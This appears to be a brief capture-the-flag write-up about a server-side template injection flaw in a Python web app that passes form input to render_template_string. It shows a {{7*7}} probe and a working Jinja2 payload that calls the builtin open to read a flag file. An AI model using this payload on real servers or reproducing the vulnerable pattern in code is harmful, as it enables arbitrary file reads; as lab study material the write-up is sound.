This code is vulnerable to user-supplied malicious payloads

```python
user_input = request.form.get('user_input')
        try:
            result = render_template_string(user_input)
```

{{7*7}} verifies that the code is vulnerable to template injection as it returns 49, which means that the server is processing the inputted template



Sending the payload: ```{{ self.__init__.__globals__.__builtins__.open('flag').read() }}``` will return the flag as it reads the flag file defined in the supplied source code files.
